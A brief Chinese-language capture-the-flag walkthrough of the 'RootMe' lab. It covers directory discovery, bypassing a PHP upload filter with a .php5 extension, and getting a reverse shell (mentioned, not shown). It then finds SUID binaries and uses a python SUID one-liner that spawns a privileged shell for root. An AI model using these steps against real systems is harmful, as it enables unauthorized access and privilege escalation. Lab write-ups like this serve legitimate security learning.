# RootMe

信息收集:
```
/panel
/Website.zip
/uploads
```

`/panel` 可上传文件，上传 PHP 被拦截。经测试，发现是后端验证。
但是换了个后缀名 `php5` 就绕过了。后面看源码发现只是限制 `php` 不能上传。

连接 reverse shell，在 `/var/www/user.txt` 发现 flag

尝试 `sudo -l`，但是要密码。
寻找 SUID 文件。
```
find / -perm -4000 -type f 2>/dev/null
```

发现 `python`，上 `gtfobins`
```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
提权成功

`/root/root.txt`

